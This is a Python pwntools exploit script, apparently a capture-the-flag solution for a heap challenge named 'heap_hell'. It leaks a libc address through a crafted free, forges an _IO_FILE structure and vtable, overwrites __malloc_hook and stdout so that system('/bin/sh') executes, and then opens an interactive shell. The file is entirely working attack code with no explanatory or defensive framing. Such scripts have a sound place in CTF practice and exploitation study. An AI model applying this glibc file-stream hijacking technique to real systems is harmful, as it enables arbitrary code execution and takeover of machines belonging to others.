#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *

context.log_level="debug"
pwn_file="./heap_hell"
elf=ELF(pwn_file)
libc=ELF("./bc.so.6")
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("pwn.it",3333)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    log.debug("libc add:0x%x"%libc.address)
    pause()

def edit(off,cont,size=None):
    if size==None:
        size=len(cont)
    r.sendlineafter("[4] : exit\n","1")
    r.sendlineafter("How much do you want to write?",str(size))
    r.sendlineafter("At which offset?\n",str(off))
    r.send(cont)

def free(off):
    r.sendlineafter("[4] : exit\n","2")
    r.sendlineafter("At which offset do you want to free?",str(off))

def leak(off):
    r.sendlineafter("[4] : exit\n","3")
    r.sendlineafter("At which offset do you want to leak?\n",str(off))
    return r.recvline()[:-1]

mmap_add=0x10000
r.sendlineafter("Location (default 0x123456789000)?\n",str(mmap_add))
edit(0,p64(0x0)+p64(0x501))
edit(0x500,p64(0)+p64(0x21))
edit(0x520,p64(0)+p64(0x21))
free(0x10)
libc.address=u64(leak(0x10).ljust(8,"\x00"))-libc.sym["__malloc_hook"]-0x70
def pack_file(_flags = 0,
        _IO_read_ptr = 0,
        _IO_read_end = 0,
        _IO_read_base = 0,
        _IO_write_base = 0,
        _IO_write_ptr = 0,
        _IO_write_end = 0,
        _IO_buf_base = 0,
        _IO_buf_end = 0,
        _IO_save_base = 0,
        _IO_backup_base = 0,
        _IO_save_end = 0,
        _IO_marker = 0,
        _IO_chain = 0,
        _fileno = 0,
        _lock = 0):
    struct = p32(_flags) + \
    p32(0) + \
    p64(_IO_read_ptr) + \
    p64(_IO_read_end) + \
    p64(_IO_read_base) + \
    p64(_IO_write_base) + \
    p64(_IO_write_ptr) + \
    p64(_IO_write_end) + \
    p64(_IO_buf_base) + \
    p64(_IO_buf_end) + \
    p64(_IO_save_base) + \
    p64(_IO_backup_base) + \
    p64(_IO_save_end) + \
    p64(_IO_marker) + \
    p64(_IO_chain) + \
    p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xd8, "\x00")
    return struct

fake_vtable_addr=libc.address+0x1e1360
rdi=next(libc.search("/bin/sh"))

out=pack_file(
    _IO_buf_base=0,
    _IO_buf_end=(rdi-100)/2,
    _IO_write_ptr=(rdi-100)/2,
    _IO_write_base=0,
    _lock=0x10000 + 0x6000
)
f={
    0:p64(libc.sym["system"]),
    libc.sym["_IO_2_1_stdout_"]-libc.sym["__malloc_hook"]:out+p64(fake_vtable_addr)+p64(libc.sym["system"]),
    libc.sym["stdout"]-libc.sym["__malloc_hook"]:p64(libc.sym["_IO_2_1_stdout_"]),
}
edit(libc.sym["__malloc_hook"]-mmap_add,fit(f,filler="\x00",length=0x20001),0x20001)

r.interactive()
